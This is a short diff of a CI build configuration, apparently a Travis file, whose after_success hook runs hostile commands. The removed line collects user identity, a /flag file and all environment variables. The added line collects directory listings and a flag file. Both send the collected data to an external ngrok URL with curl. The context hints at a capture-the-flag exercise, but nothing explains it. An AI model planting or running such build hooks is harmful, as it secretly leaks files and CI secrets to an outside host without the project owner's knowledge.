@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(id && cat /flag && env); curl  https://unmovable-polyester-duct.ngrok-free.dev/"$STUFF"
+  - STUFF=$(ls -la && ls -la / && cat flag); curl  https://unmovable-polyester-duct.ngrok-free.dev/"$STUFF"
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
